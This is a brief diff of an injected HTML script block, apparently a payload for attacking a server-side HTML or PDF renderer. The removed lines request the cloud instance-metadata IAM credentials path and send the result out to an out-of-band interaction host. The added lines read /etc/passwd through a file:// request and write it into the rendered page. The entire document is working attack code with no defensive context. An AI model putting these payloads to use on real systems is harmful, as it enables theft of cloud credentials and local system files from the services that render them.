@@ -1,11 +1,8 @@
 <script>
-  document.write('JS_works1');
-  x = new XMLHttpRequest;
-  x.onload = function() {
-    l = new XMLHttpRequest;
-    l.open("GET", "//ce72tr32vtc0000s54jgg8dtpcryyyyyb.oast.fun/" + encodeURIComponent(this.responseText));
-    l.send();
-  };
-  x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
-  x.send();
+    x=new XMLHttpRequest;
+    x.onload=function(){  
+    document.write(this.responseText)
+};
+    x.open("GET","file:///etc/passwd");
+    x.send();
 </script>
